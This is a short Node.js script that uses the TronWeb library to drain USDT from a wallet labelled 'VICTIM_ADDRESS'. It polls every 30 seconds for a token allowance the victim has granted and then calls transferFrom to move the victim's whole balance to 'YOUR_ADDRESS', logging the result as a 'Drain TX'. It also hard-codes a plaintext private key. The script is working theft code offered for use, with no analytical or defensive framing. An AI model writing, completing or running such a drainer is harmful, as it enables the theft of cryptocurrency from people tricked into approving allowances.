const TronWeb = require('tronweb');

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: '5f885be2e50d28b5e75359170c8bd413f27622f326d8751048fe1f7a9a55fb5f'
});

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const VICTIM_ADDRESS = 'TT757EE5Q4SBC1hPBECNv7T1GHFDegUzDJ';
const YOUR_ADDRESS = 'TTqwF7eEkWDzTnDFh6haLYHusoR7D31uRo';

async function checkAndDrain() {
    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const allowance = await contract.allowance(VICTIM_ADDRESS, YOUR_ADDRESS).call();
        const balance = await contract.balanceOf(VICTIM_ADDRESS).call();
        
        console.log('Allowance:', tronWeb.fromSun(allowance));
        console.log('Balance:', tronWeb.fromSun(balance));
        
        if (allowance > 0 && balance > 0) {
            const tx = await contract.transferFrom(VICTIM_ADDRESS, YOUR_ADDRESS, balance).send({
                feeLimit: 100000000
            });
            console.log('Drain TX:', tx);
        } else {
            console.log('No allowance or balance yet. Waiting...');
        }
    } catch (e) {
        console.error(e);
    }
}

setInterval(checkAndDrain, 30000);
checkAndDrain();
